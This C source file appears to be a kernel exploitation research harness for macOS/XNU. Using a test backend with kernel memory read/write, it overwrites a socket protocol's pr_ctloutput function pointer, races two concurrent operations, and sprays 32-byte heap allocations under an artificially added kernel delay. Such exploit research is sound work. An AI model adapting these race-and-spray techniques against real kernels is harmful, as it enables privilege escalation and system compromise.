//
//  kmem_xepg.c
//  xe
//
//  Created by admin on 12/14/21.
//

#include <stdio.h>
#include <stdatomic.h>

#include <sys/socket.h>
#include <sys/sysctl.h>
#include <sys/errno.h>
#include <dispatch/dispatch.h>
#include <gym_client.h>

#include "kmem.h"
#include "kmem_gym.h"
#include "slider.h"
#include "kmem_xepg.h"
#include "xnu_proc.h"
#include "util_dispatch.h"
#include "util_misc.h"

#include "platform_types.h"
#include "platform_constants.h"
#include "platform_variables.h"


struct ifnet_duration_stats {
    long max;
    long min;
    long sum;
    long latest;
    size_t count;
};

void thread_spin_wait(_Atomic int* sem) {
    while (*sem != 0) {};
}

void thread_spin_notify(_Atomic int* sem) {
    atomic_fetch_sub(sem, 1);
}

void thread_spin(uint64_t count) {
    for (uint64_t i=0; i<count; i++) {}
}

void init_xepg(uintptr_t proc, xe_kmem_xepg_t xepg) {
    int fd = xe_kmem_xepg_get_fd(xepg);
    uintptr_t socket;
    int error = xe_xnu_proc_find_fd_data(proc, fd, &socket);
    assert(error == 0);
    
    uintptr_t protosw = xe_kmem_read_uint64(KMEM_OFFSET(socket, TYPE_SOCKET_MEM_SO_PROTO_OFFSET));
    xe_kmem_write_uint64(KMEM_OFFSET(protosw, TYPE_PROTOSW_MEM_PR_CTLOUTPUT_OFFSET), 0x98a7fe002d5a6a1c);
}

int try(uintptr_t proc, int slide) {
    xe_kmem_xepg_t xepg1;
    int error = xe_kmem_xepg_create(&xepg1);
    assert(error == 0);
    init_xepg(proc, xepg1);
    
    xe_kmem_xepg_t xepg2;
    error = xe_kmem_xepg_create(&xepg2);
    assert(error == 0);
    init_xepg(proc, xepg2);
    
    size_t slot_count = XE_PAGE_SIZE / 32 * 10;
    slot_id_t* slot_ids = malloc(sizeof(slot_id_t) * slot_count);
        
    _Atomic int sem_dispatch_1 = 2;
    uintptr_t sem_dispatch_1_ptr = (uintptr_t)&sem_dispatch_1;
    _Atomic int sem_dispatch_2 = 2;
    uintptr_t sem_dispatch_2_ptr = (uintptr_t)&sem_dispatch_2;
    
    dispatch_semaphore_t dsem1 = dispatch_semaphore_create(0);
    dispatch_semaphore_t dsem2 = dispatch_semaphore_create(0);
    dispatch_semaphore_t dsem3 = dispatch_semaphore_create(0);
        
    dispatch_async(xe_dispatch_queue(), ^(void) {
        _Atomic int* sem_dispatch_1 = (_Atomic int*)sem_dispatch_1_ptr;
        
        int error = xe_kmem_xepg_execute(xepg1, slide + 0);
        assert(error == 0);
        
        thread_spin_notify(sem_dispatch_1);
        thread_spin_wait(sem_dispatch_1);
        thread_spin(0);
        
        error = xe_kmem_xepg_execute(xepg1, slide + 1);
        if (error == ETIME) {
            printf("[WARN] dq0: panic\n");
        } else if (error == EALREADY) {
            printf("[WARN] dq0: dye change\n");
        }
        
        dispatch_semaphore_signal(dsem1);
        printf("[INFO] d0 done\n");
    });
    
    dispatch_async(xe_dispatch_queue(), ^(void) {
        _Atomic int* sem_dispatch_1 = (_Atomic int*)sem_dispatch_1_ptr;
        _Atomic int* sem_dispatch_2 = (_Atomic int*)sem_dispatch_2_ptr;
        thread_spin_notify(sem_dispatch_1);
        thread_spin_wait(sem_dispatch_1);
        
        int error = xe_kmem_xepg_execute(xepg2, slide + 0);
        assert(error == 0);
        
        thread_spin_notify(sem_dispatch_2);
        thread_spin_wait(sem_dispatch_2);
        
        error = xe_kmem_xepg_execute(xepg2, slide + 1);
        if (error == ETIME) {
            printf("[WARN] dq1: panic\n");
        } else if (error == EALREADY) {
            printf("[WARN] dq1: dye change\n");
        }
        
        dispatch_semaphore_signal(dsem2);
        printf("[INFO] d1 done\n");
    });
    
    dispatch_async(xe_dispatch_queue(), ^(void) {
        _Atomic int* sem_dispatch_2 = (_Atomic int*)sem_dispatch_2_ptr;
        thread_spin_notify(sem_dispatch_2);
        thread_spin_wait(sem_dispatch_2);
        
        int error = gym_multi_alloc_mem(32, slot_ids, slot_count);
        assert(error == 0);
        
        char data[32];
        memset(data, 0xa, sizeof(data));
        error = gym_multi_write_mem(slot_ids, slot_count, data, sizeof(data));
        assert(error == 0);
        
        dispatch_semaphore_signal(dsem3);
        printf("[INFO] d2 done\n");
    });
    
    dispatch_semaphore_wait(dsem1, DISPATCH_TIME_FOREVER);
    dispatch_semaphore_wait(dsem2, DISPATCH_TIME_FOREVER);
    dispatch_semaphore_wait(dsem3, DISPATCH_TIME_FOREVER);
    
    gym_multi_free_mem(slot_ids, slot_count, NULL);
    free(slot_ids);
    
    xe_kmem_xepg_destroy(&xepg1);
    xe_kmem_xepg_destroy(&xepg2);
    dispatch_release(dsem1);
    dispatch_release(dsem2);
    dispatch_release(dsem3);
    
    return 0;
}

struct ifnet_duration_stats read_stats(void) {
    struct ifnet_duration_stats stats;
    size_t size = sizeof(stats);
    int res = sysctlbyname("kern.xepg_ifnet_duration_stats", &stats, &size, NULL, 0);
    assert(res == 0);
    return stats;
}

long read_success_stat(void) {
    long stat;
    size_t size = sizeof(stat);
    int res = sysctlbyname("kern.xepg_ifnet_duration_last_success", &stat, &size, NULL, 0);
    assert(res == 0);
    return stat;
}

int main(void) {
    xe_kmem_use_backend(xe_kmem_gym_create());
    xe_slider_init();
    
    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
    uintptr_t proc = xe_xnu_proc_current_proc(kernproc);
    
    long delay = 5000000000L;
    if (sysctlbyname("kern.xepg_ifnet_artifical_delay", NULL, NULL, &delay, sizeof(delay))) {
        printf("[ERROR] cannot set artifical delay\n");
        abort();
    }
    
    size_t size = sizeof(delay);
    delay = 0;
    if (sysctlbyname("kern.xepg_ifnet_artifical_delay", &delay, &size, NULL, 0)) {
        printf("[ERROR] cannot get aritficial delay, err: %s\n", strerror(errno));
        abort();
    }

    assert(delay == 5000000000L);
    for (int i=0; i<100; i++) {
        printf("try %d\n", i);
        try(proc, 0);
    }
}
